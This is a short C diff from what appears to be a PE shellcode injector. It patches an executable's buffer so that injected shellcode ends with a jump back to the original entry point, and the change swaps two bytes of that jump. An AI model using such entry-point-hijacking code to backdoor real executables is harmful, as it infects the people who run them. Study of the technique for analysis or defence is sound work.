@@ -79,8 +79,8 @@ int main(int argc , char **argv){
 
 
 		void *dst = pe->buffer + id.offset_in_file + cf_shellcode->size;
-		*(unsigned char *)(dst + sizeof(uint32_t)) = 0x0c;
-		*(unsigned char *)(dst + sizeof(uint32_t) + 1) = 0xe9;
+		*(unsigned char *)(dst + sizeof(uint32_t)) = 0xe9;
+		*(unsigned char *)(dst + sizeof(uint32_t) + 1) = 0x0c;
 
 		*(uint32_t *)(dst) = oldEntry + pe->image_nt_header->image_optional_header.imageBase;
 		printf("value %x\n",oldEntry + pe->image_nt_header->image_optional_header.imageBase);
